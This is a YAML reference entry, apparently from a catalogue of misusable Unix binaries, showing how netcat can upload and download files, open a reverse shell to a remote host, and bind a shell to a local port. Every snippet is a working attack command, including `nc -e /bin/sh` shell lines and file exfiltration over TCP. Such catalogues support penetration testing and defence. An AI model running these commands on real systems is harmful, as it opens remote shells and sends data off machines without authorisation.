---
functions:
  upload:
    - description: |
        Send a file to a TCP port. Run `nc -l -p 8000 > "where_to_save"` to collect the file on the other end.
      code: |
        RHOST=10.0.0.1
        RPORT=8000
        LFILE=file_to_send
        nc $RHOST $RPORT < "$LFILE"
  download:
    - description: Fetch remote file from a remote TCP port. Run `nc 10.0.0.2 8000 < "file_to_send"` to send the file from the other end.
      code: |-
        LPORT=8000
        LFILE=where_to_save
        nc -l -p $LPORT > "$LFILE"
  reverse-shell:
    - description: Run `nc -l -p 8000` to receive the shell on the other end.
      code: |
        RHOST=10.0.0.1
        RPORT=8000
        nc -e /bin/sh $RHOST $RPORT
  bind-shell:
    - description: Run `nc 10.0.0.2 8000` to connect to the shell on the other end.
      code: |
        LPORT=8000
        nc -l -p $LPORT -e /bin/sh
---
